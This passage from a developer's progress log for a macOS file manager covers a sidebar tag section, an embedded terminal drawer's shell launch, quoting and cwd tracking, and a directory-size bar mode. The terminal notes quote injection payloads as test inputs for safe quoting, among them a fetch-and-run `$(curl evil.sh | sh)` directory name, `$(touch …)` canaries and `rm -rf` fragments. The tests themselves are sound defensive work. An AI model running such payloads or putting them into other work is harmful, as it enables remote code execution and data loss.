  with it, live, `Zebra` came out purple. `knownTagNames` survives as a computed property (the search
  sheet's chip completion still wants names), and the stock seven are seeded and **never overwritten**
  by a sighting — a file carrying a malformed colourless `Red` (a shape the core found in the wild)
  must not repaint the sidebar's Red.
- **"All Tags…" appears only when there is something behind it.** Finder can always offer it because
  it knows every tag you own; we know the ones we have *seen* (no public API — the system's list is
  Finder's synced plist, and the core deliberately doesn't read it), so an unconditional row would do
  nothing when clicked on a fresh launch. Expansion is one-way: the row it replaces is the only thing
  that would collapse it, and nobody who asked to see their tags wants to hide them again.
- **Rebuild only on a real change.** The scan notification fires for every directory change in either
  pane on every tab, and almost none discover a new tag; rebuilding regardless would drop the
  sidebar's selection constantly. Same "is this real?" gate the server-activity observer applies.

**VERIFIED LIVE** (fixtures: real `xattr`-written tags in `~/Documents`, an indexed location — `/tmp`
is not indexed, so `mdfind` finds nothing there): the section renders as a pixel match for Finder's;
no "All Tags…" while only stock tags were known (home held `Green, Purple` — both stock, correctly not
custom); browsing to the fixtures made "All Tags…" appear with no relaunch; expanding showed `Zebra`
**purple**; clicking Red opened a "Red" results tab with the 3 fixtures **plus a Red file elsewhere on
the machine** (proving it searches everywhere, like Finder's sidebar tags, not the open folder);
unchecking View ▸ Show Tags removed the section, re-checking restored it. 590 core + 33 app tests,
swiftformat + swiftlint-strict clean, fixtures removed.

Progress (2026-07-15, M6 pass 7 — the terminal-drawer core): the pure, tested foundation of the
drawer, the core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no drawer view, no
SwiftTerm, no menu — this is the shell/cwd/quoting half). **Four new `DirnexCore/Services/` files,
purely additive** (no existing-API change, so the app is untouched and needs no rebuild). User chose
the item and the approach up front: terminal drawer next, and **SwiftTerm** (MIT, macOS 10.15+) as
the embedded emulator — Dirnex's first third-party dependency, landing in pass 8's app target only
(Sparkle 2 is already planned for M7, so a dep is not unprecedented; the core stays dependency-free).
Everything below was **probed against the real thing before any Swift was written** — the pass-1
`git` lesson — and it killed the plan's own design:

- **THE FINDING: there is no shell-integration snippet, and there should not be one.** The plan
  specced "'cd sync back' via shell integration snippet", i.e. the traditional emulator route: have
  the user paste a hook into `~/.zshrc` that prints OSC 7 (`\e]7;file://host/path\a`) at every
  prompt, then parse it out of the terminal's output. SwiftTerm even hands it over pre-parsed. macOS
  ships that hook — but probing `/etc/zshrc` showed it is sourced only via
  `[ -r "/etc/zshrc_$TERM_PROGRAM" ] && . "/etc/zshrc_$TERM_PROGRAM"`, and Apple ships only
  `/etc/zshrc_Apple_Terminal`, so an honest drawer must ship and install its own. **The kernel
  already knows.** `proc_pidinfo(PROC_PIDVNODEPATHINFO)` reports any same-user process's cwd, the
  drawer's shell is our own child, and Dirnex is unsandboxed by design (§2) — so `cd` is visible with
  **no dotfile edits, no snippet, and no cooperation from the shell**: it works on first launch, for
  `fish`/`nushell` as well as `zsh`, and for a `cd` inside a subshell or script. **Measured at
  0.75 µs**, so it can simply be asked whenever the terminal produces output — no timer, no polling
  an idle app. It is also the *safer* half of the choice: OSC 7 is bytes written by whatever runs in
  the terminal (SwiftTerm's own docs warn the contents are "entirely under the control of the remote
  application"), so an `ssh` host or a `cat` of a crafted file could push a path at the panel; the
  kernel cannot be talked into lying about our child's cwd. Nothing parses OSC 7 even though it is
  free. This is the `SSH_ASKPASS` shape again — the plan predicts machinery the OS makes unnecessary.
- **`TerminalShell.swift`** — the launch descriptor (executable, `argv[0]`, environment), pure like
  `GitCommand`'s argv. `$SHELL` is *asked*, never assumed (this very account runs `/bin/bash`; the
  `/bin/zsh` default is only a fallback). **`argv[0]` carries a leading dash** — that is the whole
  login-shell mechanism, and it is why Terminal.app runs `-zsh`: without it `~/.zprofile` never runs,
  and on a stock Mac that is where Homebrew's `shellenv` lives, so the drawer would be missing half
  the user's tools. The dash asks for login and the pty makes it interactive, so no `-l`/`-i`.
  **`TERM_PROGRAM` is load-bearing and naming ourselves honestly is what keeps us out of the user's
  files**: claiming `Apple_Terminal` would buy that OSC 7 emitter at the price of everything else in
  Apple's file — probed: with `TERM_SESSION_ID` set it creates `~/.zsh_sessions/$ID.session`,
  repoints `HISTFILE` at a per-session file, and restores-then-deletes saved session state, i.e. the
  drawer would quietly take over Terminal.app's session bookkeeping and split the user's history.
  `TERM_PROGRAM=Dirnex` names us for what we are, and `/etc/zshrc_Dirnex` does not exist. The
  inherited terminal identity (`TERM_SESSION_ID`, `ITERM_*`, `LC_TERMINAL*`) is **stripped**, because
  Dirnex launched from a terminal (`open`, `xcodebuild`) inherits it and would hand our child
  somebody else's session id.
- **`ShellCommandLine.swift`** — the security-critical half, and the reason it is pure and tested: a
  directory name is **attacker-controlled data** (unzip something from the internet and you can be
  browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
  POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
  bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
  **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
  half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
  typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
  needed because `bash`'s `^U` only kills *backwards* from the cursor. `cd --` ends option parsing;
  the leading space is a courtesy to `HIST_IGNORE_SPACE` users (off by default, so what actually
  keeps history clean is emitting **nothing** when the shell is already there — the common case).
- **`ShellWorkingDirectory.swift`** — the two syscall reads plus the pure follow policy. `isAtPrompt`
  is `tcgetpgrp` on the pty, which asks exactly the right question — "would my keystrokes reach the
  shell?" — and is the gate that stops Dirnex typing a `cd` into somebody's `vim`. The policy
  compares **resolved** paths on both sides, because a panel showing `/tmp` that tells its shell to
  `cd -- '/tmp'` gets `/private/tmp` back and would "follow" the shell to the place it already was,
  moving the view in response to its own message. A panel inside an archive or on SFTP never follows.
- **`ExternalTerminal.swift`** — the item's "open in iTerm/Terminal/WezTerm as alternative" half,
  `ExternalDiffTool`'s shape verbatim (injected `pathExists`, `installed`/`preferred`, uninstalled ⇒
  absent from the menu rather than an error). Two launch shapes because they are genuinely different
  programs: an app bundle via `open -a <bundle> <dir>` (Terminal, iTerm — macOS registers them as
  folder handlers, so no shell command is typed and no quoting exists on this path) vs a CLI taking a
  flag (`wezterm start --cwd <dir>`). Terminal.app is the always-installed fallback, `FileMerge`'s role.
+36 tests → **626 core tests** (was 590). `swift test` green, swiftformat + swiftlint-strict clean;
app target untouched. **VERIFIED LIVE** — a throwaway harness compiled against the real core driving
a **real login shell in a real pty** (the pass-1 method), 12/12: the kernel saw `cd` with nothing
installed anywhere; the shell followed the panel; the **ping-pong guard held against the real
`/tmp`→`/private/tmp` symlink** (and typed no second `cd`); a directory named ``it's a "test"
$(touch …) `touch …` ;rm -rf boom; & |x`` was entered **verbatim with neither substitution firing**;
`^U^K` cleared an abandoned `echo THIS_MUST_NOT_RUN` which never executed while the `cd` still
landed; `isAtPrompt` read true idle → **false while `sleep` ran** → true again; and the shell itself
reported `TP=Dirnex TERM=xterm-256color V=0.1-harness SESSION=[] CWDFN=[none]` — the inherited
session id stripped and **Apple's `update_terminal_cwd` undefined, proving its dotfile was not
sourced**. `ExternalTerminal` was driven for real too: `open -a Terminal <dir>` opened Terminal with
its shell's cwd exactly on target (read back through this pass's own libproc route), then quit.
GOTCHAS, both harness-only but both instructive: (1) **`fork()` in a process that has touched
libdispatch may only `exec`** — a Swift allocation in the child (building argv/envp) SIGTRAPs, so
every C string must be built *before* the fork; (2) a `DispatchSource` handler written in top-level
code **inherits `@MainActor`** and then trips Swift 6's `dispatch_assert_queue` when it runs on a
background queue — it needs `{ @Sendable in }`. (3) A near-miss worth recording: the harness's own
first cut compared a **raw kernel path against a resolved one** and reported a failure that did not
exist. `URL.resolvingSymlinksInPath` normalizes that pair by *stripping* `/private`, not adding it
(`/private/tmp/x` and `/tmp/x` both → `/tmp/x`), so it agrees with the kernel only when applied to
**both** sides — which the policy does, and a doc note now pins for pass 8, which supplies that closure.
**NEXT (M6 pass 8, the app layer):** add SwiftTerm (v1.14.0) to the app target, a drawer
`NSSplitViewItem` below the panes hosting `LocalProcessTerminalView` (spawned via `TerminalShell`,
`currentDirectory:` at the active pane so opening it types nothing), cwd-follow both ways off
`shellPid`/`childfd` on output-settle, and the `ExternalTerminal` menu items; then the
size-visualization mode.

Progress (2026-07-15, M6 pass 8 — the terminal-drawer app layer; **the box closes `[x]`, VERIFIED
LIVE**): the drawer is real — a login shell in a real pty under the panes, following them both ways.
**Dirnex's first third-party dependency landed** (SwiftTerm v1.14.0, `exactVersion`, MIT), whose
resolved revision was checked against the tag's own hash from `git ls-remote`. That exposed a
`.gitignore` rule that had been harmless until this pass: **`Package.resolved` was blanket-ignored**
— correct while the only package was local `DirnexCore` (a library resolves at its checkout), wrong
the moment the app gained a remote dep, because `exactVersion` pins the *tag* and a tag can be
moved; the resolution file is the only thing pinning the **revision**. Now un-ignored for the app's
copy only (Apple's own rule: apps commit their resolution, libraries don't). Pass 7's four
core files needed **no changes to be used** — the app only supplies the two things a pure core
can't: SwiftTerm's API surface and the OS's answers. Both were **probed before any Swift was
written** (the pass-1 method), and both the plan's own shape and my own first design were corrected
by what the probe said:
- **THE BLOCKER, and a real cost the plan didn't foresee: SwiftTerm needs Xcode 26's Metal
  toolchain.** v1.12.0 added a Metal renderer with `resources: [.process("Apple/Metal/Shaders.metal")]`,
  so Xcode compiles that shader on **every build regardless of whether we ever use it** (we don't —
  `setUseMetal` is opt-in and defaults off; the toolchain is a pure build-time tax). Xcode 26 no
  longer bundles the compiler, so the first build died on `cannot execute tool 'metal'`. The escape
  hatch was v1.11.2, the last release before the renderer — measured, not guessed, at **2,742 added
  lines** across the emulator core, the Mac view and `LocalProcess` since (PTY backpressure, an
  `EV_VANISHED` crash fix, macOS 26 tracking), i.e. a year-old emulator to dodge a download. User
  chose the toolchain: `xcodebuild -downloadComponent MetalToolchain`, **688 MB**, one-time per
  machine — **and a one-line step M7's notarized-DMG CI now needs.** Resolving SwiftTerm also pulls
  `swift-argument-parser` (its `Termcast` demo's dep); it is pinned but never linked.
- **`@preconcurrency` on the SwiftTerm delegate, earned rather than sprinkled.** SwiftTerm is a
  Swift 5 module whose delegate protocol carries no isolation, so a `@MainActor` conformance turns
  the guarantee into a *runtime assertion* — worth checking, not hoping. Read the library: every
  delivery runs on the queue `LocalProcess` is built with, which `LocalProcessTerminalView` leaves
  nil and the library resolves to `DispatchQueue.main` (`dataReceived` via `drainReceivedData`,
  `processTerminated` via a `DispatchSource` on that same queue); the one background-queue call site
  is commented out upstream. The annotation is sound because the code says so.
- **THE BUG LIVE VERIFICATION CAUGHT, on the first run, on this very machine: `LANG=en_UA.UTF-8`,
  and `perl: warning: Setting locale failed.`** macOS lets you pick language and region separately,
  and this account is English-in-Ukraine — a pair for which **no locale exists** (Apple ships
  `en_US`, `uk_UA`, and 81 others; not that one). Pass 7's `localeIdentifier` was honest and the app
  fed it a preference, not a locale. `TerminalShell.usableLocaleIdentifier` now runs it past an
  injected probe (app-side: `newlocale(3)`, **208 ns**, asks the same database the child's
  `setlocale` will, and unlike `setlocale` doesn't touch our own process-global locale) and falls
  back to **`C.UTF-8`** — neutral, because the point of `LANG` is the *codeset*, and inventing
  `en_US` for a Ukrainian user would be a guess about their conventions where `C` is an honest
  absence of one. Verified after: `LANG=[C.UTF-8]`, perl silent, and `Ünïcodé-Хостинг-日本語.txt`
  round-trips intact — Latin, Cyrillic and CJK, all 39 bytes. **This is what the plan's "shell
  integration snippet" would never have found: it is Terminal.app's own famous bug, reproduced
  because we set the same variable.**
- **`TerminalDrawerViewController`** — the thin client. `$SHELL` asked (this account really is
  `/bin/bash` — the login banner proved it live), `execName` with its dash (the process table shows
  `-bash`), `currentDirectory:` at the active pane so **opening the drawer types nothing**, and the
  shell **spawned lazily on first open**, never at window load. `dataReceived` is overridden to ask
  the kernel where the shell is **on every chunk of output — no timer, and an idle app is asked
  nothing**; at 0.75 µs (pass 7) that beats a debounce, since the expensive half (navigating a pane)
  is gated behind an actual change and a `cd` is rare where echoed keystrokes are not.
- **⌃`, and the responder chain doing the work.** User picked it over the ⌃-letter layer the app's
  own popups live on (⌃T/⌃D/⌃Q) — every one of those letters is the shell's (⌃D is EOF, ⌃Q is XON),
  and the drawer is the one surface whose keystrokes belong to somebody else. No stand-aside code
  was needed: a focused terminal leaves **no pane in the responder chain**, so the pane commands
  find no target and disable themselves — *visible in the live Go menu, entirely greyed* — and their
  keys fall through. ⌃D really did reach the shell as EOF. The one place that needed a hand was the
  window's Esc monitor, which would have eaten `vim`'s entire modal interface to close a preview.
- **`ExternalTerminalLauncher`** — `ExternalDiffLauncher` verbatim over the pure model; `Open in
  Terminal` (Go menu, no shortcut, generic title so the registry keeps one title for menu and
  palette alike) opened Terminal.app at the pane's directory, iTerm/WezTerm being absent here.
+6 tests → **632 core tests** (was 626) + 33 app; `swift test` green, swiftformat + swiftlint-strict
clean. Two recurring gotchas re-fired and were paid down rather than suppressed: `validateMenuItem`'s
cyclomatic limit (Go's items moved to `validateNavigationItem`) and `BrowserWindowController`'s
250-line body (Quick View moved to `+QuickView`, mirroring the pane's own split).
**VERIFIED LIVE**, the built app driven end to end: the drawer opened at `~` with **no `cd` typed**;
`cd /usr/local` in the shell walked the pane there **without stealing the keyboard**; clicking the
other pane typed exactly ` cd -- '/Users/oleg/Dev/Common'` (leading space, `--`, POSIX quotes); a
directory named ``it's a "test" $(touch /tmp/PWNED) `touch /tmp/PWNED2` ;rm -rf boom; & |x`` was
typed **verbatim with neither canary created**; the **ping-pong guard held against the real `/tmp`
symlink** (pane stayed on `/tmp`, one `cd`, no second); `isAtPrompt` **typed nothing at all while
`sleep 15` held the foreground**, and nothing retroactively after; `exit` closed the drawer and the
next ⌃` gave a clean screen and a fresh shell **in the active pane's directory**; and ⌘Q left **no
orphaned shell**. GOTCHAS: (1) **a notification banner (`UserNotificationCenter`) taking front makes
Dirnex's window non-key, which greys out *every* pane menu item and swallows ⌘L** — this looked
exactly like a focus bug I had introduced, and I nearly "fixed" a non-bug; re-tested with the banner
gone, clicking a pane row takes focus back correctly. Verify twice before believing a UI symptom.
(2) The drawer's first open was a **four-line sliver** — AppKit gives an item with no saved geometry
its `minimumThickness` — and it was sitting in my own verification screenshots for several passes
before I read them; `shouldSizeTerminalDrawer` now seeds 200 pt on the first open only, the same
first-launch-has-no-autosave trick `shouldCenterPanesDivider` uses. The drawer's height *and* its
open/closed state persist via `NSSplitView` autosave, so a drawer left open reopens with the window
(and spawns its shell then) exactly as the sidebar behaves.
FOLLOW-UP (user, same day): the prompt sat flush against the drawer's left border. SwiftTerm draws
column zero against its own bounds and has **no padding API**, so the view is inset 6 pt and the
container paints the strip — asking the *terminal* for `nativeBackgroundColor` rather than copying a
colour, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
FOLLOW-UP (user, same day): **the drawer beeped on every pane switch** — "like pressing a
non-existent shortcut", which is exactly what it was: `NSSound.beep()`, reached the long way round.
`ShellCommandLine`'s `^U^K` opens the follow-`cd`, and **`bash` binds `^U` to readline's
`unix-line-discard`, which *rings the bell* instead of killing when the cursor is at column zero** —
i.e. at every idle prompt, which is the only state we ever type into. The BEL reaches SwiftTerm,
whose `bell` delegate is `NSSound.beep()`. Fixed by **prefixing one space**, so `^U` always has
something to kill; the space dies with the line. Probed in a real pty before and after, across
`bash`/`zsh` × emacs/vi × empty/half-typed, driving the **actual bytes the shipping code emits**:
the whole matrix has exactly one BEL, `bash` + bare `^U` + empty prompt, and it is gone. **The two
obvious "cleaner" fixes are both wrong, and the pty said so.** `^A^K` (the idiomatic clear-line)
is a **security regression**: in `bash` *vi* mode neither `^A` nor `^K` is bound, so both insert
**literally**, nothing is cleared, and a half-typed `echo CANARY` **executed** with our `cd` appended
— precisely the `rm -rf /` hazard the sequence exists to prevent. `^U` alone leaves the tail of a
line abandoned mid-cursor. Only `^U` is bound in vi-insert, so the fix had to keep it. **Pre-existing
and NOT fixed** (separate from the beep, and invisible to a user in emacs mode): in vi-insert `^K`
inserts literally, so the `cd` never lands and the shell prints `bash: \x0b: command not found` —
today's `^U^K` is equally broken there. +2 tests → **634 core**; the exact-sequence expectations in
`ShellCommandLineTests`/`ShellWorkingDirectoryTests` pin the space, one of them explicitly as the
beep regression. LESSON, the same one as the sliver: **pass 8's live verification watched the `cd`
appear and never noticed the sound**; a screenshot cannot hear, and the drawer is the one surface
that talks back in audio.
FOLLOW-UP (user, same day): **the vi-mode `cd`, which pass 8 logged as "pre-existing and NOT fixed"
— now fixed, and it was worse than logged.** Dumping both keymaps out of the real shells settles the
design question: **neither `bash`'s `vi-insert` nor `zsh`'s `viins` binds any forward kill** — `^K`,
`^A`, `^E` are all `self-insert` in both — so there was never a keystroke to find. Two things the
beep pass missed, both live in shipped code: (1) **`zsh` binds `^U` to `vi-kill-line`, which kills
back only to *where insert mode was entered*.** A user who types a command, hits `ESC`, then `A` to
append has their insert point at end-of-line, so `^U` clears **nothing** and their abandoned words
**execute** with our `cd` glued on — the exact `rm -rf /` hazard the clear-line exists to prevent,
and the same verdict pass 8 handed `^A^K`. Dropping `^K` does not save it. (2) **`^U^K` rings 5–8
BELs in vi *command* mode**, so pass 8's beep fix never held for vi users. Measured over
bash/zsh × emacs/vi × 6 prompt states: old `^U^K` lands **8/18**, executes user text once, **26
BELs**. **Fix: `^C` alone, and the insight is that it is not a keystroke** — it is `VINTR`, turned
into `SIGINT` by the *terminal line discipline* below the editor, so the keymap cannot matter; and
every shell answers `SIGINT` at a prompt with a fresh line **in insert mode**, the only thing that
also rescues a user idling in vi *command* mode (where `cd -- '/x'` is read as editor commands).
**18/18 land, 0 executions, 0 BELs**, driving the bytes `swiftc` actually emits. The
flush hazard is real but does not bite — `SIGINT` flushes the tty input queue, yet the `cd` is
queued *behind* the signal and survived **96/96** across same-write/split-write/delayed. It is safe
to send a signal at all only because `isAtPrompt` (`tcgetpgrp == shell`) already gates every write,
so it can never reach somebody's `vim`. **COST, chosen deliberately by the user over leaving vi
broken:** `SIGINT` redraws the prompt, so a followed `cd` leaves the abandoned prompt above it —
3 pane switches render **7 rows instead of 4** (2 lines per move, not 1), for emacs users too. Only
real moves pay it (`command(toFollow:)` stays silent when the shell is already there). Exact-sequence
tests re-pinned to `^C`; the ding regression now asserts no `^U` exists to ring at all; +1 test that
no keymap-dependent key is ever sent → **635 core**. `fish` reasoned-through but unverified (not
installed). LESSON: **the idiomatic clear-line keys are all bets on a keymap we do not own** — three
passes reached for `^A^K`, `^U^K`, `^U`, and a pty called each one; the only reliable way into a line
editor you do not control is the channel underneath it.
**NEXT (M6 pass 9):** size-visualization mode (ncdu-style bars, async, cached) — the next `[ ]`
item; then Share sheet / "Open With" / Services, and the automation slice that M6's exit criteria
name ("a user-defined convert-to-webp script runs from the palette").

Progress (2026-07-16, M6 pass 9 — the size-visualization core): the pure, tested half of the
size-viz item, the same core-first opener every slice since M4 has used. Box stays `[ ]` (no toggle,
no bar column, no provider, no app wiring) — this is the projection/cache half. **Two new
`DirnexCore/VFS/` files plus one purely-additive method on `DirectoryModel`/`Panel`** (no existing
API changed, so the app is untouched and needs no rebuild). Everything was **probed before any Swift
was written** (the pass-1 method), and the probes corrected both the plan's framing and my own first
design:
- **ncdu's rule, read from its manual instead of from memory — and it is not either/or, it is
  both.** *"Percentage is relative to the size of the current directory, graph is relative to the
  largest item in the current directory."* The two answer different questions and one number cannot
  do both, so `SizeBar` carries **`fraction`** (max-relative — the bar length, which is the only
  reason a bar column is legible when one row dominates) *and* **`share`** (total-relative — the
  label). I had been about to pick one.
- **Logical bytes, deliberately against ncdu's default of allocated disk usage — and the gap is
  real, measured, and runs BOTH ways.** `.git` (thousands of small files) allocates ~2x its logical
  bytes in 4 KB block round-up (ratio 0.513); conversely one **64 MB sparse LMDB file** in
  `DirnexCore/.build` allocates only 27 MB, pulling that whole tree to 1.082. So the choice matters
  and is not cosmetic. It goes to logical anyway because **the bar must agree with the number
  rendered beside it**: a row whose bar is twice its neighbour's while its own size column reads
  smaller is incoherent. ncdu can default to disk usage because it is a disk-usage tool *with no
  size column*; Dirnex is a file manager with one, already showing `FileEntry.byteSize`. Payoff: the
  mode reuses `DirectorySizer` exactly, with no second byte source.
- **Hard links: measured, then deliberately NOT de-duped** (ncdu does). Probed: **zero hardlinked
  files across `/Applications`, `/usr/local`, `/opt/homebrew`**; the only 10 in `~/Dev` are npm's
  `esbuild` binary, linked between `esbuild/bin/` and `@esbuild/darwin-arm64/bin/` *within the same
  `node_modules`* — so a JS tree double-counts one ~10 MB binary, ≈3 % of a 300 MB `node_modules`.
  (dev,ino) bookkeeping to correct a 3 % error that essentially never occurs is not worth it, and
  `FileEntry` carries no device number to key it on.
- **Walk cost tracks ENTRY COUNT, not bytes — the finding that shapes the whole mode.** The real
  `DirectorySizer` walks 1 TB of `~/Movies` in **0.01 s** but 17 GB of `~/Dev` in **7.7 s** (it is
  all `node_modules`); `/Applications` 8.5 s. And **`~` takes 41 s** once hidden rows are shown (68
  directories, not the 17 visible ones — `.lmstudio`, `.android`, `.cache`, `.npm` are all there).
  So bars *must* stream in progressively, and the cache is not a nicety.
- **The brutal dynamic range is a text-mode artifact, not a fact about the data.** In `~`, Movies is
  79 % of the total and at ncdu's 20 character cells **only 1 of 17 rows earns even one filled
  cell** — which is precisely why ncdu grew `--graph-style eighth-block`. We draw in AppKit at
  continuous width, ~8x finer than eighth-blocks, so pass 10 needs only a **minimum-ink rule** (a
  real 17 GB folder must never render as literally nothing).
- **`SizeVisualization`** — shaped like `GitStatusSnapshot`: every scan happens at construction so
  `bar(for:)` is O(1), because a panel asks once per visible row per render. Three properties, each
  pinned by a test. **(1) Unknown is not zero**: an unsized directory has *no* bar rather than a
  zero-width one — collapsing the two paints an unwalked 40 GB folder as empty, and only
  `computedSize` can tell them apart. **(2) Both denominators cover *visible* rows only** — hiding
  dotfiles or typing a filter re-scales everything, because a bar drawn relative to a row you cannot
  see is unexplainable, and shares that silently fail to reach 100 % are worse than shares of what is
  on screen. **(3) It re-scales for free while walks land**: rebuilding the whole projection per
  render needs no incremental bar-width bookkeeping, at the price (accepted, documented) that `share`
  is a share of *what is known so far* and settles as results arrive. The total **saturates** and
  negatives **clamp**, because `SFTPListingParser` builds sizes out of *text* and a panel must not
  trap on a hostile server's arithmetic.
- **`DirectorySizeCache`** — LRU, capacity **512, because the unit of caching here is one
  directory's total** and a size-viz panel stores one per child row: capacity is counted in "several
  panels' worth of children", not in `GitStatusProvider`'s "a few repositories" (8 snapshots), where
  the unit is the repo. Reads are **non-mutating** (eviction ordered by last *store*): the intended
  stale-while-revalidate re-stores on every visit so the orders coincide, and a mispredicted eviction
  costs a re-walk, never a wrong number — worth more than mutating on the render path. The cache is
  explicitly **a latency optimization and never an authority**: we watch only the *displayed*
  directory, so a tree that changes while you look elsewhere is silently stale (ncdu has the same
  property — its scan is a snapshot until `r` — but ncdu *looks* like a snapshot where a file panel
  looks live).
- **The invalidation rule is shaped by what an FSEvents ping actually proves.** Read
  `DirectoryWatcher` rather than assuming: its callback **discards the event paths** and the stream
  is recursive, so the only fact on offer is "something under the watched directory changed". Hence
  `invalidate(under:)` drops every cached total on the same **root-to-leaf line**: the path *and its
  descendants* (the ping does not say which one changed) *and its ancestors* (their totals sum it
  in). **Siblings survive** — that is the whole value. It is the **mirror image of
  `GitStatusSnapshot`'s roll-up**: that pushes a leaf's *status* up the line, this pushes a leaf's
  *staleness* up the same one. Conservative by construction and correct for either caller (an exact
  event path invalidates precisely; a watched root invalidates its whole line), because the trade is
  not symmetric — over-invalidating costs a re-walk, under-invalidating shows a wrong number. It goes
  through `VFSPath.isSelfOrDescendant` (backend-scoped, and right about `/a` vs `/ab`) rather than a
  hand-rolled prefix test.
FINDING (measured, and it added the one API change): **seeding a panel from the cache would have
been slower than having no cache at all.** A seed arrives as a burst of N totals and
`setDirectorySize` re-sorts the entire listing on *every* call — measured on the main actor at
5.7 ms for 68 rows, **284 ms at 1,000, and 2.5 s at 3,000**, quadratic. The cache exists to make bars
appear the instant a directory opens, and naively wired it would have frozen the panel for 2.5 s
doing so. `setDirectorySizes` (bulk, one recompute) measures **4050x faster at 3,000 rows — 2.47 s →
0.61 ms — with byte-identical ordering**, so it is the same answer, not a cheaper one.
+34 tests → **669 core tests** (was 635); `swift test` green, swiftformat + swiftlint-strict clean.
The recurring type-body-length gotcha re-fired and was paid down rather than suppressed: `PanelTests`
crossed its 250-line limit, so the computed-size tests moved to `PanelSizeTests` along the seam the
suite's own `MARK` already drew (the `CopyEngine*Tests` precedent), collapsing a duplicated helper
on the way. **VERIFIED LIVE** — a throwaway harness compiled against the real core, driving real
listings and real walks: the Dirnex repo rendered `DirnexCore` 55.8 % / `build` 43.2 % / `.git`
0.8 %, and `~` rendered Movies 79.2 % (1003.7 GB) / Library 10.3 % / Documents 3.0 %; on both,
**shares summed to exactly 1.000000, exactly one row filled the bar, and it was the heaviest one** —
with `du` agreeing inside the expected logical-vs-allocated gap (1.085 on the repo, 1.000 on Movies).
The cache was driven against a **real filesystem change**: growing `.../a/b/file.bin` from 1 KB to
9 KB and invalidating dropped `/a/b`, `/a` and the root — all three genuinely stale, truth having
moved 1050 → 9050 — while the **sibling survived and was still correct**. GOTCHA (harness-only, but
instructive): the probe **segfaulted on its first run**, in a program containing no unsafe code —
`String(format: "%s", swiftString)`. `%s` expects a C string, and handing it a Swift `String` is
undefined behaviour; `%@` or manual padding is the fix.
**NEXT (M6 pass 10, the app layer):** the panel toggle and the bar column drawn at **continuous
width** with the minimum-ink rule; a `DirectorySizeProvider` owning the cache (off-main walks via
`DirectoryLoader.size`, serialized, streamed in and seeded in bulk through `setDirectorySizes`,
FSEvents → `invalidate(under:)`), stale-while-revalidate on navigation, and no bar on the `..` row
(app-synthesized, so the core projection never sees it). **One policy question the 41 s measurement
forces and the user should settle: does toggling the mode auto-scan every child — ncdu's model,
where you wait for the scan — or scan lazily/on-demand?** Extending `DirectoryWatcher` to deliver
event paths would also keep invalidation surgical instead of dropping a whole line per ping. Then
Share sheet / "Open With" / Services, and the automation slice.

Progress (2026-07-16, M6 pass 10 — the size-visualization app layer; **the box closes `[x]`, VERIFIED
LIVE**): the toggle (⌃B), the bar column, and the scan that fills it. **The user settled pass 9's
policy question: auto-scan, ncdu's model** — and it was the only live option, because the core's
"unknown is not zero" rule means a lazy mode opens on a column that is empty for every folder in it.
**Per tab** (not an app-wide preference like Show Tags): it is what "toggle *panel* to bars" says, it
is the dual-pane payoff, and above all this is the one mode in the app that *spends* something to be
on. Probing again ran ahead of the Swift (the pass-1 method), and it **overturned two of pass 9's own
conclusions**:
- **Continuous width does NOT rescue the dynamic range — pass 9's central claim about pass 10 was
  wrong.** It reasoned that drawing in AppKit is "~8x finer than eighth-blocks, so pass 10 needs only
  a minimum-ink rule". Measured against real directories at an 80 pt bar: in `~`, **86 of 93 rows
  compute to under half a point** (12 of 15 in this repo; `/Applications`, at 6 of 38, is the only
  humane one). The range in `~` is ~10⁶, and 8x is nothing against it. So the floor is not a rounding
  nicety that buys legibility — **it is the difference between "negligible" and "empty"**, and it
  fires constantly. `SizeBar.inkWidth(in:minimum:)` went to the *core* with tests (bytes → width is
  the core's rule), and **zero bytes draws zero ink** deliberately: an empty folder is not
  negligible, it is empty. The tail stays illegible whatever we do — which is *why* pass 9's `share`
  is drawn as a number beside the bar; ncdu keeps the percentage for exactly this reason. A log/sqrt
  scale is **rejected, not deferred**: it would make the tail visible by making bar length mean
  something other than proportion, and a test pins the compression so nobody "fixes" it later.
- **FINDING: pass 9's "serialized" queue buried the one row the chart is about.** Display order is
  alphabetical and uncorrelated with walk cost, so serialized, `Movies` — **79 % of home** — landed at
  **35.7 s of a 35.7 s scan**, dead last, queued behind `Library` (17.0 s) and `Dev` (10.7 s). Movies
  itself walks in 0.03 s: the wait was head-of-line blocking, not work. Widening the queue —
  1→35.7 s/35.7 s, 4→17.9 s/**3.4 s**, 8→16.3 s/**1.8 s**, 16→15.7 s/**0.3 s** (total/t-to-Movies) —
  is not bought for throughput (total plateaus at ~15.7 s, which is `Library` alone and unsplittable)
  but so the chart is *right* within ~2 s instead of re-scaling 8x at the very end. The fear that
  bounded it was measured too, and was mostly unfounded: `DirectorySizer.size` blocks a cooperative-
  pool thread and Swift's pool does not over-commit, yet an interactive listing's **worst case stayed
  at 2.9 ms at width 8** (baseline max 3.5 ms) against M1's 150 ms budget; only width 16 — this
  machine's entire core count — perturbed it at all (12.9 ms). Width is `cores/2`, clamped [2, 8].
- **`DirectorySizeProvider`** — shaped like `GitStatusProvider`/`FinderTagProvider` (off-main, cached,
  published by notification), shared because the unit of caching is one directory's total. Drains
  **newest-request-first** so navigating never waits behind a folder you left; publishes are
  **coalesced to ~10/s**, which is what keeps a 68-directory scan from becoming 68 re-sorts and makes
  the cost independent of row count. Walks use a new `DirectoryLoader.cancellableSize` — a *child*
  task, not detached, so cancellation reaches `DirectorySizer`'s own `isCancelled` mid-walk (the
  existing detached `size` deliberately keeps outliving its caller for Space-on-dir).
- **Two bugs the live run caught that nothing else would have**, both invisible to tests and lint:
  (1) **the first toggle did nothing at all** — installed its column, then no bars and no scan. The
  projection is built inside the render pass, and `updateSizeVisualization` skipped the render when
  the cache came back empty, which is exactly a first toggle; the pending list is read *from* the
  projection that was therefore never built. (2) Fixing that exposed the next: `requestScan` runs on
  every render, and an in-flight child still has no total, so it is still "pending" — the provider
  would have re-queued the whole in-flight batch ten times a second. The provider now tracks
  `inFlight` and de-duplicates.
- Bar column is **contextual like the Git gutter but on a different condition** (the gutter follows
